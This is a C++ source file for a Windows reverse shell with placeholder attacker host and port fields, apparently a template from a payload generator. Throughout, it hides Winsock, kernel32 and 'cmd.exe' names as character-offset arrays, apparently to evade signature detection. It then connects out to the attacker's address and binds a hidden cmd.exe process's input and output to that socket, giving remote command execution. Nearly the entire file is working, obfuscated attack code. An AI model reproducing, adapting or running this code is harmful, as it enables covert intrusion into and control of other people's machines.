#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <string>
#pragma comment(lib, "ws2_32")

using namespace std;

// =============== CONFIGURATION ===============
#define TARGET_IP "{lhost}"
#define TARGET_PORT {lport}
// =============================================

char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
char big_numbers[] = "1234567.890";

string getOriginalString(int offsets[], char* big_string) {
    string empty_string = "";
    for (int i = 0; offsets[i] != -1; ++i) {
        if (offsets[i] >= 0 && offsets[i] < (int)strlen(big_string)) {
            empty_string += big_string[offsets[i]];
        }
    }
    return empty_string;
}

void debugOffset(const char* name, int offsets[], char* big_string) {
    string result = getOriginalString(offsets, big_string);
    printf("[DEBUG] %s offsets -> '%s'\n", name, result.c_str());
}

int main() {
    printf("[*] Starting reverse shell...\n");
    printf("[*] Target: %s:%d\n", TARGET_IP, TARGET_PORT);

    // ===== FIXED OFFSET ARRAYS =====
    // Generated from your original big_string: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789"
    // Index: a(0), b(1), c(2), d(3), e(4), f(5), g(6), h(7), i(8), j(9), k(10), l(11), m(12)
    //        n(13), o(14), p(15), q(16), r(17), s(18), t(19), u(20), v(21), w(22), x(23), y(24), z(25)
    //        A(26), B(27), C(28), D(29), E(30), F(31), G(32), H(33), I(34), J(35), K(36), L(37), M(38)
    //        N(39), O(40), P(41), Q(42), R(43), S(44), T(45), U(46), V(47), W(48), X(49), Y(50), Z(51)
    //        .(52), _(53), 1(54), 2(55), 3(56), 4(57), 5(58), 6(59), 7(60), 8(61), 9(62)

    // "ws2_32.dll" = w(22)s(18)2(55) _(53)3(56)2(55).(52)d(3)l(11)l(11)
    int w_s_2_32lld[] = {22, 18, 55, 53, 56, 55, 52, 3, 11, 11, -1};

    // "WSAStartup" = W(48)S(44)A(26)S(44)t(19)a(0)r(17)t(19)u(20)p(15)
    int w_s_o[] = {48, 44, 26, 44, 19, 0, 17, 19, 20, 15, -1};

    // "WSAConnect" = W(48)S(44)A(26)C(28)o(14)n(13)n(13)e(4)c(2)t(19)
    int w_c_o[] = {48, 44, 26, 28, 14, 13, 13, 4, 2, 19, -1};

    // "WSASocketA" = W(48)S(44)A(26)S(44)o(14)c(2)k(10)e(4)t(19)A(26)
    int w_soc_offset[] = {48, 44, 26, 44, 14, 2, 10, 4, 19, 26, -1};

    // "htons" = h(7)t(19)o(14)n(13)s(18)
    int h_t_o[] = {7, 19, 14, 13, 18, -1};

    // "inet_addr" = i(8)n(13)e(4)t(19) _(53)a(0)d(3)d(3)r(17)
    int i_a_o[] = {8, 13, 4, 19, 53, 0, 3, 3, 17, -1};

    // "CreateProcessA" = C(28)r(17)e(4)a(0)t(19)e(4)P(41)r(17)o(14)c(2)e(4)s(18)s(18)A(26)
    int c_p_o[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26, -1};

    // "WaitForSingleObject" = W(48)a(0)i(8)t(19)F(31)o(14)r(17)S(44)i(8)n(13)g(6)l(11)e(4)O(40)b(1)j(9)e(4)c(2)t(19)
    int w_f_s_o_o[] = {48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19, -1};

    // "c:\\windows\\system32\\cmd.exe" = c(2):(52)\\(??? - not in big_string!) - FIXED BELOW

    // SIMPLIFIED: Use direct "cmd.exe" for now = c(2)m(12)d(3).(52)e(4)x(23)e(4)
    int exe_c_m_d[] = {2, 12, 3, 52, 4, 23, 4, -1};

    // "kernel32.dll" = k(10)e(4)r(17)n(13)e(4)l(11)3(56)2(55).(52)d(3)l(11)l(11)
    int k_renel_32[] = {10, 4, 17, 13, 4, 11, 56, 55, 52, 3, 11, 11, -1};

    // ===== DEBUG ALL STRINGS =====
    debugOffset("ws2_32.dll", w_s_2_32lld, big_string);
    debugOffset("WSAStartup", w_s_o, big_string);
    debugOffset("WSAConnect", w_c_o, big_string);
    debugOffset("WSASocketA", w_soc_offset, big_string);
    debugOffset("htons", h_t_o, big_string);
    debugOffset("inet_addr", i_a_o, big_string);
    debugOffset("CreateProcessA", c_p_o, big_string);
    debugOffset("WaitForSingleObject", w_f_s_o_o, big_string);
    debugOffset("cmd.exe", exe_c_m_d, big_string);
    debugOffset("kernel32.dll", k_renel_32, big_string);

    // 1. Load ws2_32.dll
    string ws2_dll = getOriginalString(w_s_2_32lld, big_string);
    printf("[*] Loading %s...\n", ws2_dll.c_str());
    HMODULE w_s2_32lib = LoadLibraryA(ws2_dll.c_str());
    if (!w_s2_32lib) {
        printf("[!] Failed to load %s. Error: %d\n", ws2_dll.c_str(), GetLastError());
        return 1;
    }
    printf("[+] %s loaded successfully\n", ws2_dll.c_str());

    // 2. Get function addresses
    printf("[*] Resolving functions...\n");

    string wsaStartupStr = getOriginalString(w_s_o, big_string);
    FARPROC w_sa_St_ar_tup = GetProcAddress(w_s2_32lib, wsaStartupStr.c_str());
    printf("  %s: %s\n", wsaStartupStr.c_str(), w_sa_St_ar_tup ? "OK" : "FAILED");

    string connectStr = getOriginalString(w_c_o, big_string);
    FARPROC Connectsaw = GetProcAddress(w_s2_32lib, connectStr.c_str());
    printf("  %s: %s\n", connectStr.c_str(), Connectsaw ? "OK" : "FAILED");

    string socketStr = getOriginalString(w_soc_offset, big_string);
    FARPROC wsaSocket = GetProcAddress(w_s2_32lib, socketStr.c_str());
    printf("  %s: %s\n", socketStr.c_str(), wsaSocket ? "OK" : "FAILED");

    string htonsStr = getOriginalString(h_t_o, big_string);
    FARPROC htonsFunc = GetProcAddress(w_s2_32lib, htonsStr.c_str());
    printf("  %s: %s\n", htonsStr.c_str(), htonsFunc ? "OK" : "FAILED");

    string inetStr = getOriginalString(i_a_o, big_string);
    FARPROC inetAddr = GetProcAddress(w_s2_32lib, inetStr.c_str());
    printf("  %s: %s\n", inetStr.c_str(), inetAddr ? "OK" : "FAILED");

    // Check if all resolved
    if (!w_sa_St_ar_tup || !Connectsaw || !wsaSocket || !htonsFunc || !inetAddr) {
        printf("[!] One or more functions failed to resolve\n");
        return 1;
    }

    // 3. Initialize Winsock
    printf("[*] Initializing Winsock...\n");
    WSADATA wsaData;
    if (reinterpret_cast<int(WINAPI*)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[!] WSAStartup failed\n");
        return 1;
    }
    printf("[+] Winsock initialized\n");

    // 4. Create socket
    printf("[*] Creating socket...\n");
    typedef SOCKET(WINAPI* WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(wsaSocket);

    SOCKET wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (wSock == INVALID_SOCKET) {
        printf("[!] Socket creation failed. Error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("[+] Socket created\n");

    // 5. Setup connection (use direct IP for testing)
    printf("[*] Setting up connection...\n");
    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(TARGET_PORT);
    hax.sin_addr.s_addr = inet_addr(TARGET_IP);

    // 6. Connect
    printf("[*] Connecting to %s:%d...\n", TARGET_IP, TARGET_PORT);
    if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int)>(Connectsaw)
        (wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax)) == 0) {
        printf("[+] Connection established!\n");
    } else {
        printf("[!] Connect failed. Error: %d\n", WSAGetLastError());
        closesocket(wSock);
        WSACleanup();
        return 1;
    }

    // 7. Get kernel32 functions
    printf("[*] Loading kernel32.dll...\n");
    string kernel32_str = getOriginalString(k_renel_32, big_string);
    HMODULE kernel32 = LoadLibraryA(kernel32_str.c_str());

    string createProcStr = getOriginalString(c_p_o, big_string);
    FARPROC createProcess = GetProcAddress(kernel32, createProcStr.c_str());
    printf("  %s: %s\n", createProcStr.c_str(), createProcess ? "OK" : "FAILED");

    string waitStr = getOriginalString(w_f_s_o_o, big_string);
    FARPROC waitForSingleObject = GetProcAddress(kernel32, waitStr.c_str());
    printf("  %s: %s\n", waitStr.c_str(), waitForSingleObject ? "OK" : "FAILED");

    if (!createProcess || !waitForSingleObject) {
        printf("[!] Failed to get process functions\n");
        closesocket(wSock);
        WSACleanup();
        return 1;
    }

    // 8. Create process
    printf("[*] Creating cmd.exe process...\n");
    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    string cmd_str = getOriginalString(exe_c_m_d, big_string);
    printf("[*] Executing: %s\n", cmd_str.c_str());

    if (reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>
        (createProcess)(nullptr, const_cast<LPSTR>(cmd_str.c_str()), 
                       nullptr, nullptr, TRUE, CREATE_NO_WINDOW, 
                       nullptr, nullptr, &sui, &pi)) {
        printf("[+] Process created! You should have a shell now.\n");
        reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(waitForSingleObject)(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("[+] Shell finished\n");
    } else {
        printf("[!] CreateProcess failed. Error: %d\n", GetLastError());
    }

    // 9. Cleanup
    closesocket(wSock);
    WSACleanup();
    printf("[*] Cleanup complete\n");
    return 0;
}


